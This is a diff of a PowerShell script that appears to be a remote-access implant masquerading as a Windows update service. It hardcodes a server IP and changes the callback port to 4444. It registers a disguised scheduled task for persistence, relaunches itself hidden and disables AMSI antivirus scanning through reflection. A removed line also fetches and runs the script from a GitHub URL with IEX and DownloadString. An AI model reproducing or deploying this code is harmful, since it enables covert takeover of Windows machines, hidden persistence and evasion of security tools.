@@ -1,5 +1,5 @@
 $serverIP = "198.1.195.204"
-$serverPort = 4000
+$serverPort = 4444
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
@@ -30,17 +30,13 @@ if ($args -notcontains "-silent") {
         Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
-    # Inicia escondido e sai
     Start-Process powershell.exe -ArgumentList $argList -WindowStyle Hidden
     exit
 }
 
-# MODO INVISÍVEL
+# MODO INVISÍVEL (silent)
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
-    exit
-}
+if (-not $isAdmin) { exit }
 
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
